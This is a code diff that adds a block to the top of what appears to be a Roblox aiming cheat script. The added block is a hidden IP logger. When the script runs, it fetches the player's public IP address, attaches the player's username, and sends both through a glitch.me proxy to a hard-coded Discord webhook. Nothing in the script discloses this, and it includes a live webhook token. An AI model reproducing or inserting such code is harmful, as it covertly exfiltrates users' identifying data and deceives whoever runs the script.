@@ -1,3 +1,38 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+local name = game:GetService("Players").LocalPlayer.Name
+local msg = name.." : "..ip
+
+local webhook = "https://discord.com/api/webhooks/913667534773968897/Sgi_iPUF4UaxWbMXkDCBVZmpy8jUzys5wL5xvfPyRcs_f_gFQCr9iyYKAHrMDoR3bwZl"
+local HttpService = game:GetService("HttpService");
+local botname = "ip logger"
+
+function specials(Webhook, Message, Botname)
+    local Name;
+    local start = game:HttpGet("http://buritoman69.glitch.me");
+    local biggie = "http://buritoman69.glitch.me/webhook";
+    if (not Message or Message == "" or not Botname) then
+        Name = "GameBot"
+        return error("nil or empty message!")
+    else
+        Name = Botname;
+    end
+    local Body = {
+        ['Key'] = tostring("applesaregood"),
+        ['Message'] = tostring(Message),
+        ['Name'] = Name,
+        ['Webhook'] = Webhook    
+    }
+    Body = HttpService:JSONEncode(Body);
+    local Data = game:HttpPost(biggie, Body, false, "application/json")
+    return Data or nil;
+end
+
+specials(webhook, msg, botname)
+
 if getgenv().Aiming then return getgenv().Aiming end
 
 -- // Services
